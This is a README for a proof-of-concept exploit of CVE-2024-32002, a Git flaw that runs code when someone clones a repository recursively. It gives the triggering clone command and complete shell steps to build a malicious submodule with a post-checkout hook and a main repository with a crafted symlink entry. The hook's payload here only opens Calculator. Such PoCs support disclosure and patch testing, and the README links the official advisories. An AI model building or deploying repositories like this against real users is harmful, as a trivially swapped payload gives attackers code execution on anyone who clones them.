# CVE-2024-32002
A simple proof-of-concept that executes Calculator (macOS example only). When using `git clone --recursive` command, this repo will also pull https://github.com/markuta/hooky, which contains a `post-checkout` script. Mostly based on the commit fix [t7406-submodule-update.sh](https://github.com/git/git/blob/97065761333fd62db1912d81b489db938d8c991d/t/t7406-submodule-update.sh#L1182) file.

## Run
> **Note**: Versions prior to `2.45.1`, `2.44.1`, `2.43.4`, `2.42.2`, `2.41.1`, `2.40.2`, and `2.39.4` are vulnerable.
```
git clone --recursive github.com/markuta/CVE-2024-32002
```

## Create your own repositories
```
# Submodule repo (payload)
git init hooky
cd hooky
mkdir -p y/hooks 
echo "open -a Calculator.app" > y/hooks/post-checkout
chmod +x y/hooks/post-checkout
git add y/hooks/post-checkout
git commit -m post-checkout
hook_repo_path="$(pwd)"

# Main repo
git init captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m add-submodule
printf .git >dotgit.txt
git hash-object -w --stdin <dotgit.txt >dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info
git update-index --index-info <index.info
git commit -m add-symlink
```

## Further info
More info about the vulnerability can be found [here](https://github.blog/2024-05-14-securing-git-addressing-5-new-vulnerabilities/) and [here](https://github.com/git/git/security/advisories/GHSA-8h77-4q3w-gfgv).
